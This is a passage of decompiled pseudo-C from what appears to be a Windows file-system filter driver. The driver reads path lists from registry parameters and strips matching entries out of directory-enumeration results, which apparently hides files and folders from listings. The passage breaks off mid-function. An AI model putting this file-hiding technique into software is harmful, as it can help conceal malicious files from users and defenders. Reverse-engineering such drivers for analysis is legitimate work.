  v15 = _mm_cvtsi128_si32(*a10);
  v20[0] = *a10;
  if ( v15 && *(_WORD *)(v11 + 2 * ((unsigned __int64)v15 >> 1) - 2) == 92 )
  {
    v15 -= 2;
    LOWORD(v20[0]) = v15;
    v14 = (__m128i)v20[0];
  }
  MEMORY[0x6001606000E2202](a1, 0LL, a10, a11 + 2);
  for ( i = *a11; i != (__int64 *)a11; i = (__int64 *)*i )
  {
    v20[0] = v14;
    v16 = *((unsigned __int16 *)i + 12);
    if ( v15 < (unsigned __int16)v16 )
      continue;
    if ( v15 > (unsigned __int16)v16 )
    {
      if ( *(_WORD *)(v11 + 2 * ((unsigned __int64)*((unsigned __int16 *)i + 12) >> 1)) != 92 )
        continue;
      LOWORD(v20[0]) = *((_WORD *)i + 12);
    }
    LOBYTE(v17) = 1;
    if ( !(unsigned int)MEMORY[0x2A0000077C4](i, 0LL, v20, i + 3, v17) )
    {
      LOBYTE(v12) = 1;
      break;
    }
  }
  MEMORY[0xE641800036822](i, v12, v16, a11 + 2);
  return v12;
}


// Function: sub_294C at 0x294C
// attributes: thunk
char __fastcall sub_294C(__int64 a1, __int64 a2, unsigned __int64 a3, _QWORD **a4, __int64 a5)
{
  return sub_27B0(a1, a2, a3, a4, a5);
}


// Function: sub_2954 at 0x2954
// attributes: thunk
char __fastcall sub_2954(
        __int64 a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        __m128 a8,
        __int64 a9,
        __m128i *a10,
        __int64 **a11)
{
  return sub_2874(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}


// Function: sub_295C at 0x295C
char __fastcall sub_295C(__int64 a1, __int64 a2, unsigned __int64 a3, _QWORD **a4, __int64 a5, _DWORD *a6)
{
  __m128i v6; // xmm0
  char v7; // bl
  unsigned __int16 v10; // r10
  __int64 v12; // rdx
  __int64 v13; // r8
  _QWORD *i; // rdi
  int v15; // eax
  __m128i v17; // [rsp+20h] [rbp-28h] BYREF

  v6 = *(__m128i *)a3;
  v7 = 0;
  *a6 = 0;
  v10 = _mm_cvtsi128_si32(v6);
  v17 = v6;
  if ( v10 )
  {
    a3 = (unsigned __int64)v10 >> 1;
    if ( *(_WORD *)(v17.m128i_i64[1] + 2 * a3 - 2) == 92 )
      v17.m128i_i16[0] = v10 - 2;
  }
  MEMORY[0x6001606000E2202](a1, a6, a3, a4 + 2);
  for ( i = *a4; i != a4; i = (_QWORD *)*i )
  {
    LOBYTE(v13) = 1;
    if ( !(unsigned int)MEMORY[0x2A0000077C4](i, a6, &v17, i + 5, v13) )
    {
      LOBYTE(v13) = 1;
      v15 = MEMORY[0x2A0000077C4](i, a6, a5, i + 7, v13);
      if ( !v15 )
      {
        ++*a6;
        v7 = 1;
        break;
      }
      if ( v15 >= 0 )
        break;
      ++*a6;
    }
  }
  MEMORY[0xE641800036822](i, a6, v12, a4 + 2);
  return v7;
}


// Function: sub_2A2C at 0x2A2C
void __fastcall sub_2A2C(int a1, int a2, int a3, int a4, int a5, int a6)
{
  sub_2B84(a1, a2, a3, a4, a5, a6);
  JUMPOUT(0x13640F06530602LL);
}


// Function: sub_2A50 at 0x2A50
char __fastcall sub_2A50(_DWORD a1, _DWORD a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  unsigned __int16 v5; // r8
  unsigned __int16 v6; // r9
  char result; // al
  __int16 v8; // r8
  __int16 v9; // r9

  v4 = *(_QWORD *)(a3 + 8);
  v5 = *(_WORD *)a3 >> 1;
  if ( !v5 )
    return 0;
  v6 = *(_WORD *)a3 >> 1;
  while ( *(_WORD *)(v4 + 2LL * --v6) != 92 )
  {
    if ( !v6 )
      return 0;
  }
  if ( (unsigned int)v6 + 1 >= v5 )
    return 0;
  v8 = 2 * (v5 - v6) - 2;
  *(_QWORD *)(a4 + 40) = v4 + 2 + 2LL * v6;
  *(_WORD *)(a4 + 32) = v8;
  v9 = 2 * v6;
  *(_WORD *)(a4 + 34) = v8;
  result = 1;
  *(_OWORD *)a4 = *(_OWORD *)a3;
  *(_QWORD *)(a4 + 24) = *(_QWORD *)(a3 + 8);
  *(_WORD *)(a4 + 16) = v9;
  *(_WORD *)(a4 + 18) = v9;
  return result;
}


// Function: sub_2AF4 at 0x2AF4
__int64 __fastcall sub_2AF4(__int64 a1, __int64 a2, unsigned int a3, _QWORD *a4)
{
  __int64 v4; // rdi
  __int64 result; // rax
  __int64 v7; // rax
  _DWORD *v8; // rbx

  v4 = a3;
  if ( a3 >= 4 )
    return 3221225851LL;
  v7 = MEMORY[0x81E1A50023003](a3, a4, 88LL, 0LL, 1281587301LL);
  v8 = (_DWORD *)v7;
  if ( !v7 )
    return 3221225506LL;
  *(_QWORD *)(v7 + 24) = 0LL;
  *(_DWORD *)(v7 + 32) = 0;
  *(_QWORD *)(v7 + 8) = v7;
  *(_QWORD *)v7 = v7;
  *(_DWORD *)(v7 + 16) = 1;
  MEMORY[0x700B320F0006340F](v4, a4, 1LL, v7 + 40);
  v8[19] = 0;
  v8[18] = 1;
  result = 0LL;
  v8[20] = v4;
  *a4 = v8;
  return result;
}


// Function: sub_2B84 at 0x2B84
__int64 __fastcall sub_2B84(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rdx
  _QWORD *i; // rdi
  _QWORD *v7; // rcx
  int v8; // eax
  __int64 v9; // rdx
  _QWORD *v10; // rax

  MEMORY[0x6001606000E2202](a1, a2, a3, a4 + 16);
  for ( i = *(_QWORD **)a4; i != (_QWORD *)a4; MEMORY[0x13640F06530602](i, a2, 1281587301LL) )
  {
    v7 = i;
    i = (_QWORD *)*i;
    if ( *((_DWORD *)v7 + 5) )
    {
      v8 = *(_DWORD *)(a4 + 76);
      if ( v8 )
        *(_DWORD *)(a4 + 76) = v8 - 1;
    }
    v9 = *v7;
    if ( *(_QWORD **)(*v7 + 8LL) != v7 || (v10 = (_QWORD *)v7[1], (_QWORD *)*v10 != v7) )
      __fastfail(3u);
    *v10 = v9;
    *(_QWORD *)(v9 + 8) = v10;
  }
  MEMORY[0xE641800036822](i, a2, v5, a4 + 16);
  return 0LL;
}


// Function: sub_2C0C at 0x2C0C
__int64 __fastcall sub_2C0C(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v5; // r14d
  __int64 v6; // rsi
  __int64 v7; // rdx
  _QWORD *v8; // rcx
  __int64 v9; // rax
  _QWORD *v10; // rdx
  _QWORD *v11; // rcx
  int v12; // eax
  __int64 v13; // rdx
  _QWORD *v14; // rax

  v5 = a3;
  v6 = 3221226021LL;
  MEMORY[0x6001606000E2202](a1, 3221226021LL, a3, a4 + 16);
  v8 = *(_QWORD **)a4;
  if ( *(_QWORD *)a4 != a4 )
  {
    while ( 1 )
    {
      v9 = *v8;
      if ( v5 == *((_DWORD *)v8 + 4) )
        break;
      v8 = (_QWORD *)*v8;
      if ( v9 == a4 )
        goto LABEL_8;
    }
    if ( *(_QWORD **)(v9 + 8) != v8 || (v10 = (_QWORD *)v8[1], (_QWORD *)*v10 != v8) )
LABEL_17:
      __fastfail(3u);
    *v10 = v9;
    *(_QWORD *)(v9 + 8) = v10;
    MEMORY[0x13640F06530602](a1, 3221226021LL, 1281587301LL);
    v6 = 0LL;
  }
LABEL_8:
  if ( *(_DWORD *)(a4 + 76) )
  {
    a1 = *(_QWORD **)a4;
    while ( a1 != (_QWORD *)a4 )
    {
      v11 = a1;
      a1 = (_QWORD *)*a1;
      if ( v5 == *((_DWORD *)v11 + 5) )
      {
        v12 = *(_DWORD *)(a4 + 76);
        if ( v12 )
        {
          *(_DWORD *)(a4 + 76) = v12 - 1;
          v13 = *v11;
          if ( *(_QWORD **)(*v11 + 8LL) != v11 )
            goto LABEL_17;
          v14 = (_QWORD *)v11[1];
          if ( (_QWORD *)*v14 != v11 )
            goto LABEL_17;
          *v14 = v13;
          *(_QWORD *)(v13 + 8) = v14;
          MEMORY[0x13640F06530602](a1, v6, 1281587301LL);
        }
      }
    }
  }
  MEMORY[0xE641800036822](a1, v6, v7, a4 + 16);
  return (unsigned int)v6;
}


// Function: sub_2D00 at 0x2D00
_BOOL8 __fastcall sub_2D00(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rcx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  _BOOL8 result; // rax

  v4 = *(_QWORD *)(a4 + 16);
  result = 1;
  if ( *(_BYTE *)(v4 + 5) == 1 )
  {
    v5 = *(_DWORD *)(v4 + 40) - 1;
    if ( !v5 )
      return 0;
    v6 = v5 - 1;
    if ( !v6 )
      return 0;
    v7 = v6 - 1;
    if ( !v7 )
      return 0;
    v8 = v7 - 9;
    if ( !v8 || (unsigned int)(v8 - 25) <= 1 )
      return 0;
  }
  return result;
}


// Function: sub_2D34 at 0x2D34
__int64 __fastcall sub_2D34(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8)
{
  __int64 v8; // rbx
  __int64 v10; // rbx
  int v11; // eax
  int v12; // r8d
  int v13; // r9d
  __int64 v14; // rcx

  a8 = v8;
  a7 = 0LL;
  v10 = *(_QWORD *)(a4 + 16);
  if ( *(int *)(a4 + 24) >= 0 )
  {
    v11 = sub_74F6(a4, a2, 1LL, a4, &a7);
    if ( v11 >= 0 )
    {
      switch ( *(_DWORD *)(v10 + 40) )
      {
        case 1:
          v11 = sub_3078(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
        case 2:
          v11 = sub_318C(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
        case 3:
          v11 = sub_2F64(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
        case 0xC:
          v11 = sub_34C8(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
        case 0x25:
          v11 = sub_32A0(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
        case 0x26:
          v11 = sub_33B4(a4, a2, a7, *(_QWORD *)(v10 + 56), v12, v13);
          break;
      }
      v14 = a7;
      *(_DWORD *)(a4 + 24) = v11;
      if ( v14 )
        sub_74FC();
    }
  }
  return 0LL;
}


// Function: sub_2E0C at 0x2E0C
__int64 __fastcall sub_2E0C(_DWORD a1, _DWORD a2, __int64 a3, _WORD *a4)
{
  int v6; // r8d
  int v7; // r9d
  int v9; // ebx
  __int16 v10; // [rsp+20h] [rbp-18h] BYREF
  unsigned __int16 v11; // [rsp+22h] [rbp-16h]
  __int64 v12; // [rsp+28h] [rbp-10h]

  v11 = *a4 + 512;
  v12 = MEMORY[0x81E1A50023003](a4, a3, v11, 1LL, 1145596998LL);
  v10 = 0;
  if ( !v12 )
    return 3221225632LL;
  v9 = sub_3BC8((_DWORD)a4, a3, (unsigned int)&v10, (_DWORD)a4, v6, v7);
  if ( v9 >= 0 )
    v9 = sub_25CC((int)a4, a3, (int)&v10, 50716, a3);
  MEMORY[0x13640F06530602](a4, a3, 1145596998LL, v12);
  return (unsigned int)v9;
}


// Function: sub_2EB8 at 0x2EB8
__int64 __fastcall sub_2EB8(_DWORD a1, _DWORD a2, _DWORD *a3, _WORD *a4)
{
  int v6; // r8d
  int v7; // r9d
  int v9; // ebx
  unsigned __int16 v10; // [rsp+20h] [rbp-18h] BYREF
  unsigned __int16 v11; // [rsp+22h] [rbp-16h]
  __int64 v12; // [rsp+28h] [rbp-10h]

  v11 = *a4 + 512;
  v12 = MEMORY[0x81E1A50023003](a4, a3, v11, 1LL, 1145596998LL);
  v10 = 0;
  if ( !v12 )
    return 3221225632LL;
  v9 = sub_3BC8((_DWORD)a4, (_DWORD)a3, (unsigned int)&v10, (_DWORD)a4, v6, v7);
  if ( v9 >= 0 )
    v9 = sub_275C((int)a4, (__int64)a3, &v10, 50694LL, a3, 0);
  MEMORY[0x13640F06530602](a4, a3, 1145596998LL, v12);
  return (unsigned int)v9;
}


// Function: sub_2F64 at 0x2F64
__int64 __fastcall sub_2F64(__int64 a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // r14
  unsigned __int64 v5; // r15
  __int64 i; // rsi
  __int64 v8; // rcx
  char v9; // cl
  __int64 result; // rax
  char v11; // bp
  unsigned int *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-28h] BYREF
  char *v18; // [rsp+28h] [rbp-20h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v8 = 50716LL;
      v18 = (char *)a4 + 94;
      v17[0] = *((_WORD *)a4 + 30);
      v17[1] = *((_WORD *)a4 + 30);
      if ( (a4[14] & 0x10) == 0 )
        v8 = 50694LL;
      v9 = sub_27B0(a1, i, v5, (_QWORD **)v8, (__int64)v17);
      result = *a4;
      if ( v9 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v11 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)result )
    {
      *v4 += result;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v11 = 1;
    }
    a1 = 0LL;
    sub_7AF0(0LL, i, 0LL, a4, 96LL);
    if ( v11 )
      return (unsigned int)a1;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v12 = (unsigned int *)((char *)a4 + result);
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + result);
    v15 = v12;
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(a1, i, v12, a4, v15[15] + 94 + v13);
    goto LABEL_16;
  }
  LODWORD(a1) = -2147483622;
  return (unsigned int)a1;
}


// Function: sub_3078 at 0x3078
__int64 __fastcall sub_3078(__int64 a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // r14
  unsigned __int64 v5; // r15
  __int64 i; // rsi
  __int64 v8; // rcx
  char v9; // cl
  __int64 result; // rax
  char v11; // bp
  unsigned int *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-28h] BYREF
  unsigned int *v18; // [rsp+28h] [rbp-20h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v8 = 50716LL;
      v18 = a4 + 16;
      v17[0] = *((_WORD *)a4 + 30);
      v17[1] = *((_WORD *)a4 + 30);
      if ( (a4[14] & 0x10) == 0 )
        v8 = 50694LL;
      v9 = sub_27B0(a1, i, v5, (_QWORD **)v8, (__int64)v17);
      result = *a4;
      if ( v9 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v11 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)result )
    {
      *v4 += result;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v11 = 1;
    }
    a1 = 0LL;
    sub_7AF0(0LL, i, 0LL, a4, 72LL);
    if ( v11 )
      return (unsigned int)a1;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v12 = (unsigned int *)((char *)a4 + result);
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + result);
    v15 = v12;
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(a1, i, v12, a4, v15[15] + 64 + v13);
    goto LABEL_16;
  }
  LODWORD(a1) = -2147483622;
  return (unsigned int)a1;
}


// Function: sub_318C at 0x318C
__int64 __fastcall sub_318C(__int64 a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // r14
  unsigned __int64 v5; // r15
  __int64 i; // rsi
  __int64 v8; // rcx
  char v9; // cl
  __int64 result; // rax
  char v11; // bp
  unsigned int *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-28h] BYREF
  unsigned int *v18; // [rsp+28h] [rbp-20h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v8 = 50716LL;
      v18 = a4 + 17;
      v17[0] = *((_WORD *)a4 + 30);
      v17[1] = *((_WORD *)a4 + 30);
      if ( (a4[14] & 0x10) == 0 )
        v8 = 50694LL;
      v9 = sub_27B0(a1, i, v5, (_QWORD **)v8, (__int64)v17);
      result = *a4;
      if ( v9 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v11 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)result )
    {
      *v4 += result;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v11 = 1;
    }
    a1 = 0LL;
    sub_7AF0(0LL, i, 0LL, a4, 72LL);
    if ( v11 )
      return (unsigned int)a1;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v12 = (unsigned int *)((char *)a4 + result);
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + result);
    v15 = v12;
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(a1, i, v12, a4, v15[15] + 68 + v13);
    goto LABEL_16;
  }
  LODWORD(a1) = -2147483622;
  return (unsigned int)a1;
}


// Function: sub_32A0 at 0x32A0
__int64 __fastcall sub_32A0(__int64 a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // r14
  unsigned __int64 v5; // r15
  __int64 i; // rsi
  __int64 v8; // rcx
  char v9; // cl
  __int64 result; // rax
  char v11; // bp
  unsigned int *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-28h] BYREF
  unsigned int *v18; // [rsp+28h] [rbp-20h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v8 = 50716LL;
      v18 = a4 + 26;
      v17[0] = *((_WORD *)a4 + 30);
      v17[1] = *((_WORD *)a4 + 30);
      if ( (a4[14] & 0x10) == 0 )
        v8 = 50694LL;
      v9 = sub_27B0(a1, i, v5, (_QWORD **)v8, (__int64)v17);
      result = *a4;
      if ( v9 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v11 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)result )
    {
      *v4 += result;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v11 = 1;
    }
    a1 = 0LL;
    sub_7AF0(0LL, i, 0LL, a4, 112LL);
    if ( v11 )
      return (unsigned int)a1;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v12 = (unsigned int *)((char *)a4 + result);
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + result);
    v15 = v12;
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(a1, i, v12, a4, v15[15] + 104 + v13);
    goto LABEL_16;
  }
  LODWORD(a1) = -2147483622;
  return (unsigned int)a1;
}


// Function: sub_33B4 at 0x33B4
__int64 __fastcall sub_33B4(__int64 a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // r14
  unsigned __int64 v5; // r15
  __int64 i; // rsi
  __int64 v8; // rcx
  char v9; // cl
  __int64 result; // rax
  char v11; // bp
  unsigned int *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-28h] BYREF
  unsigned int *v18; // [rsp+28h] [rbp-20h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v8 = 50716LL;
      v18 = a4 + 20;
      v17[0] = *((_WORD *)a4 + 30);
      v17[1] = *((_WORD *)a4 + 30);
      if ( (a4[14] & 0x10) == 0 )
        v8 = 50694LL;
      v9 = sub_27B0(a1, i, v5, (_QWORD **)v8, (__int64)v17);
      result = *a4;
      if ( v9 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + result);
      if ( !(_DWORD)result )
        return result;
    }
    v11 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)result )
    {
      *v4 += result;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v11 = 1;
    }
    a1 = 0LL;
    sub_7AF0(0LL, i, 0LL, a4, 88LL);
    if ( v11 )
      return (unsigned int)a1;
LABEL_16:
    ;
  }
  if ( (_DWORD)result )
  {
    v12 = (unsigned int *)((char *)a4 + result);
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + result);
    v15 = v12;
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(a1, i, v12, a4, v15[15] + 80 + v13);
    goto LABEL_16;
  }
  LODWORD(a1) = -2147483622;
  return (unsigned int)a1;
}


// Function: sub_34C8 at 0x34C8
__int64 __fastcall sub_34C8(_DWORD a1, _DWORD a2, __int64 a3, unsigned int *a4)
{
  _DWORD *v4; // rsi
  unsigned __int64 v5; // rbp
  __int64 i; // rdi
  char v8; // al
  __int64 v9; // rcx
  char v10; // dl
  __int64 result; // rax
  char *v12; // rdx
  int v13; // r8d
  unsigned int v14; // eax
  unsigned int *v15; // rcx
  unsigned int v16; // r9d
  _WORD v17[4]; // [rsp+20h] [rbp-18h] BYREF
  unsigned int *v18; // [rsp+28h] [rbp-10h]

  v4 = 0LL;
  v5 = a3 + 8;
  for ( i = 0LL; ; a4 = (unsigned int *)((char *)a4 + (unsigned int)i) )
  {
    while ( 1 )
    {
      v18 = a4 + 3;
      v17[0] = *((_WORD *)a4 + 4);
      v17[1] = *((_WORD *)a4 + 4);
      v8 = sub_27B0(i, (__int64)v4, v5, (_QWORD **)0xC606, (__int64)v17);
      v9 = *a4;
      if ( v8 )
        break;
      v4 = a4;
      i = *a4;
      a4 = (unsigned int *)((char *)a4 + v9);
      if ( !(_DWORD)v9 )
        return 0LL;
    }
    v10 = 0;
    if ( !v4 )
      break;
    if ( (_DWORD)v9 )
    {
      *v4 += v9;
      i = *a4;
    }
    else
    {
      *v4 = 0;
      v10 = 1;
    }
    result = 0LL;
    *(_OWORD *)a4 = 0LL;
    if ( v10 )
      return result;
LABEL_14:
    ;
  }
  if ( (_DWORD)v9 )
  {
    v12 = (char *)a4 + v9;
    v13 = 0;
    v14 = *(unsigned int *)((char *)a4 + v9);
    v15 = (unsigned int *)((char *)a4 + v9);
    if ( v14 )
    {
      v16 = v14;
      do
      {
        v13 += v14;
        v15 = (unsigned int *)((char *)v15 + v16);
        v14 = *v15;
        v16 = *v15;
      }
      while ( *v15 );
    }
    sub_7830(i, 0LL, v12, a4, v15[2] + 12 + v13);
    goto LABEL_14;
  }
  return 2147483674LL;
}


// Function: sub_35B4 at 0x35B4
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_35B4(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // edx
  int v4; // r8d
  int v5; // r9d
  int v6; // edx
  int v7; // r8d
  int v8; // r9d
  __int64 result; // rax

  sub_74EA(a1, a2, a3, 0xC43200000000LL);
  qword_A048 = 0LL;
  sub_2A2C(a1, a2, v3, 50694, v4, v5);
  sub_2A2C(a1, a2, v6, 50716, v7, v8);
  result = 0LL;
  byte_A040 = 0;
  return result;
}


// Function: sub_3604 at 0x3604
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_3604(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 result; // rax
  int v7; // edx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  __int64 v12; // rdx
  int v13; // ebx
  int v14; // r8d
  int v15; // r9d
  __int64 v16; // rdx
  int v17; // edx
  int v18; // r8d
  int v19; // r9d

  result = sub_2AF4(a4, a2, 0, &qword_A160);
  if ( (int)result >= 0 )
  {
    result = sub_2AF4(a4, a2, 1u, &qword_A168);
    if ( (int)result >= 0 )
    {
      sub_36C4(a4, a2, v7, a3, v8, v9);
      v13 = sub_3854(a4, a2, (unsigned int)L"370033", a3, v10, v11);
      if ( v13 >= 0 )
      {
        v13 = sub_74E4(a4, a2, &unk_9170, a4, &qword_A048);
        if ( v13 >= 0 )
        {
          result = sub_74F0(a4, a2, v12, 0xC43200000000LL);
          v13 = result;
          if ( (int)result >= 0 )
          {
            byte_A040 = 1;
            return result;
          }
          sub_74EA(a4, a2, v16, 0xC43200000000LL);
        }
      }
      sub_2A2C(a4, a2, v12, 50694, v14, v15);
      sub_2A2C(a4, a2, v17, 50716, v18, v19);
      return (unsigned int)v13;
    }
  }
  return result;
}


// Function: sub_36C4 at 0x36C4
__int64 __fastcall sub_36C4(
        __int64 a1,
        _DWORD a2,
        _DWORD a3,
        __int64 a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        unsigned int a8,
        int a9,
        unsigned __int16 *a10)
{
  __int64 v10; // rsi
  __int64 v11; // rdx
  __int64 v12; // rcx
  unsigned __int16 v13; // r14
  _WORD *v14; // rbx
  __int64 v15; // r8
  __int64 v16; // rdx
  __int64 v17; // rcx
  _WORD *v18; // rbx
  __int64 v19; // r8
  __int64 v21; // [rsp+20h] [rbp-10h] BYREF
  _WORD *v22; // [rsp+28h] [rbp-8h]

  a10 = 0LL;
  a8 = 0;
  v10 = a4;
  if ( (int)sub_1898(a1, a4, (__int64)L"Parameters4", a4, (__int64 *)&a10, &a8) < 0 )
    goto LABEL_10;
  v11 = a8;
  if ( a8 > 4 )
  {
    v12 = (__int64)a10;
    v11 = a8 - 2;
    a8 -= 2;
    v13 = 0;
    a1 = *a10;
    v14 = a10 + 1;
    if ( !(_WORD)a1 )
      goto LABEL_8;
    while ( 1 )
    {
      v15 = (unsigned __int16)*v14;
      if ( (unsigned int)v11 < (unsigned __int64)(v15 + 2) )
        break;
      v21 = 0LL;
      v22 = v14 + 1;
      a8 = -2 - v15 + v11;
      WORD1(v21) = *v14;
      LOWORD(v21) = WORD1(v21);
      sub_2E0C(a1, v10, (__int64)&a9, &v21);
      ++v13;
      v14 = (_WORD *)((char *)v14 + (unsigned __int16)*v14 + 2);
      if ( v13 >= (unsigned __int16)a1 )
        break;
      v11 = a8;
    }
  }
  v12 = (__int64)a10;
LABEL_8:
  if ( v12 )
    sub_1B84(a1, v10, v11, v12);
LABEL_10:
  a10 = 0LL;
  a8 = 0;
  if ( (int)sub_1898(a1, v10, (__int64)L"Parameters5", v10, (__int64 *)&a10, &a8) < 0 )
    return 0LL;
  v16 = a8;
  if ( a8 > 4 )
  {
    v17 = (__int64)a10;
    v16 = a8 - 2;
    a8 -= 2;
    v10 = 0LL;
    a1 = *a10;
    v18 = a10 + 1;
    if ( !(_WORD)a1 )
      goto LABEL_17;
    while ( 1 )
    {
      v19 = (unsigned __int16)*v18;
      if ( (unsigned int)v16 < (unsigned __int64)(v19 + 2) )
        break;
      v21 = 0LL;
      v22 = v18 + 1;
      a8 = -2 - v19 + v16;
      WORD1(v21) = *v18;
      LOWORD(v21) = WORD1(v21);
      sub_2EB8(a1, v10, &a9, &v21);
      LOWORD(v10) = v10 + 1;
      v18 = (_WORD *)((char *)v18 + (unsigned __int16)*v18 + 2);
      if ( (unsigned __int16)v10 >= (unsigned __int16)a1 )
        break;
      v16 = a8;
    }
  }
  v17 = (__int64)a10;
LABEL_17:
  if ( v17 )
    sub_1B84(a1, v10, v16, v17);
  return 0LL;
}


// Function: sub_3854 at 0x3854
__int64 __fastcall sub_3854(_DWORD a1, _DWORD a2, _WORD *a3, _WORD *a4)
{
  int v6; // ebx
  __int64 v7; // r14
  __int64 v8; // rdx
  __int16 v9; // ax
  __int64 v10; // rdi
  __int64 v11; // rax
  __int128 v13; // [rsp+38h] [rbp-C8h] BYREF
  _BYTE v14[528]; // [rsp+50h] [rbp-B0h] BYREF
  _WORD v15[264]; // [rsp+260h] [rbp+160h] BYREF

  v6 = -1073741823;
  sub_7AF0(a4, a3, 0LL, v15, 520LL);
  v13 = 0LL;
  if ( a4 )
  {
    if ( *((_QWORD *)a4 + 1) )
    {
      if ( *a4 )
      {
        if ( a3 )
        {
          if ( *a3 )
          {
            v7 = sub_7610(a4, a3, 92LL) + 2;
            if ( (unsigned __int8)MEMORY[0xA6419000B7419](a4, a3, v8, v7) )
            {
              v9 = *a4 - v7;
              *((_QWORD *)&v13 + 1) = v7;
              LOWORD(v13) = a4[4] + v9;
              WORD1(v13) = v13;
              sub_7AF0(a4, a3, 0LL, v14, 520LL);
              v6 = sub_3AFC(
                     (_DWORD)a4,
                     (_DWORD)a3,
